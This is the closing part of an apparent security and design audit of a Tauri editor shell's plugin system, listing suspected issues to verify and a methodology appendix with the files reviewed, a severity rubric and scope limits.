- **SI-1 — Blob-URL same-origin inheritance.** `new Blob(..., { type: "application/javascript" })` + `URL.createObjectURL` + `import()` — verify whether the resulting module's `import.meta.url` leaks the shell's `origin` and whether a naive attempt to read `window.top` from inside that module is blocked. If not, this is another angle on F-8.1.1 that survives CSP but not iframe boundary.
- **SI-2 — URI handler dispatch order.** `registry.ts:782-799` iterates every registered `UriHandler` for an incoming URL and calls each. If two plugins register a handler for scheme `nexus`, both run — the second can observe what the first did and potentially override. Compare against VS Code's first-match-wins for `onUri`. Decide intent.
- **SI-3 — Settings modal does not use `clearByPlugin` on plugin uninstall.** `syncAll` calls it on reload, but manual uninstall goes through a different code path (`plugin disable` Tauri command). Confirm the disposable chain runs on disable, not only on reload.
- **SI-4 — Tree data provider caching.** `registerTreeDataProvider` stores the provider; check whether changing forge triggers a provider reset — otherwise a stale tree can render against a new root.
- **SI-5 — `queueMicrotask` in CommandPalette.** Works for the unmount race, but if the dispatched command triggers another modal open (e.g., "workspace.settings"), the two modals may briefly overlap. Visual check needed.
- **SI-6 — `PluginManager` Mutex contention.** Rust-side `PluginManager` is held behind `Mutex`. Under heavy plugin-plugin IPC (e.g., a plugin broadcasting via `publish_host_event` from its `onInit`), serialize access may create observable UI hitches. Load-test with 20 chatty plugins.
- **SI-7 — Snippet trigger collisions.** `contributions.registerSnippet` does not appear to collision-check across plugins; two plugins registering the same `trigger` string could silently overwrite. Verify and add the same first-wins + warn pattern as keybindings.

---

## 7. Methodology Appendix

**Procedure.** The audit followed the 10-dimension walkthrough prescribed in `editor-shell-auditor.md`. Shell inspiration and trust model were confirmed from `README.md` + the prior microkernel audit (`docs/MICROKERNEL-AUDIT.md`, 2026-04-16) as "VS Code + Obsidian hybrid, third-party untrusted". Each dimension was walked independently by:

1. Listing the files in scope for the dimension.
2. Reading them end-to-end (not excerpted) — the main targets being `app/src/contributions/registry.ts`, `app/src/contributions/plugins.ts`, `app/src/contributions/builtins.ts`, `app/src/plugins/scriptRuntime.ts`, `app/src/plugins/nexusContext.ts`, `app/src/plugins/events.ts`, `app/src/keybindings/*`, `app/src/stores/layout.ts`, `app/src/components/layout/WorkspaceView.tsx`, `app/src/components/palette/CommandPalette.tsx`, `app/src/components/surfaces/EditorSurface.tsx`, `app/src/components/panels/PluginPanel.tsx`, `app/src/ipc/plugins.ts`, `crates/nexus-app/src/lib.rs`, `crates/nexus-app/src/plugins.rs`, `crates/nexus-app/tauri.conf.json`, `crates/nexus-app/capabilities/default.json`, `plugins/hello-nexus/manifest.toml`, `plugins/hello-js/manifest.toml`.
3. Cross-cutting greps for dangerous primitives: `dangerouslySetInnerHTML`, `innerHTML`, `eval(`, `new Function(`, `document.createElement`, `URL.createObjectURL`, `api_version`.

**Severity rubric (reproduced from the auditor spec).**

- 🔴 Critical — violates trust model; must fix before untrusted plugin distribution.
- 🟠 High — substantive design gap; schedule before next external release.
- 🟡 Medium — rough edge a plugin author will hit; fix opportunistically.
- 🟢 Low — nit or nice-to-have.
- ✅ Strength — keep this; don't regress.

**Finding ID convention.** `F-<dim>.<sub>.<counter>`. Dimensions 1–10 follow the auditor's ordering. A finding carried over from the microkernel audit is cross-referenced, not renumbered.

**Out of scope.** WASM plugin isolation (covered in `MICROKERNEL-AUDIT.md`). Native core-plugin code. Vite build config beyond CSP. Anything below the Tauri invoke boundary.

**What this audit did not do.** No runtime fuzz-testing of plugin inputs, no static security scan, no load test, no performance profile. Suspected issues in §6 flag where those would be valuable.

---

*End of report.*
